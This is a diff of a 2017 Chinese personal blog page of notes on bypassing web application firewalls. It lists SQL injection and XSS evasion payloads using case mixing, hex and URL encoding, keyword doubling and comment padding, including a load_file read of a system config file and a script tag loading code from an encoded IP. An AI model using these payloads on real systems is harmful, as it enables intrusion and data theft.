@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2017/07/20/bypass_waf/index.html">
 <meta property="og:site_name" content="Merl1ng">
 <meta property="og:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
-<meta property="og:updated_time" content="2017-07-25T11:26:29.364Z">
+<meta property="og:updated_time" content="2017-07-25T11:28:05.466Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bypass_waf">
 <meta name="twitter:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
@@ -361,7 +361,7 @@
 <h3 id="SQL-XSS-bypass-waf"><a href="#SQL-XSS-bypass-waf" class="headerlink" title="SQL XSS bypass waf"></a>SQL XSS bypass waf</h3><p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
 <p>姿势二 字符编码<br>SQL：<code>load_file(0x633A2F77696E646F77732F6D792E696E69)</code><br>XSS：<code>&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;</code></p>
 <p>姿势三 拼凑法 其只验证一次<br>SQL：<code>selselectect verversionsion();</code><br>XSS：<code>&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt;</code></p>
-<p>姿势四 干扰字符污染法：<br>空字符 空格 TAB换行 注释 特殊的函数等等都可以<br>`SQL：sEleCt+1-1+vERsIoN   /<em>!</em>/       ();</p>
+<p>姿势四 干扰字符污染法：<br>空字符 空格 TAB换行 注释 特殊的函数等等都可以<br><code>SQL：sEleCt+1-1+vERsIoN   /*!*/       ();</code></p>
 
       
     </div>
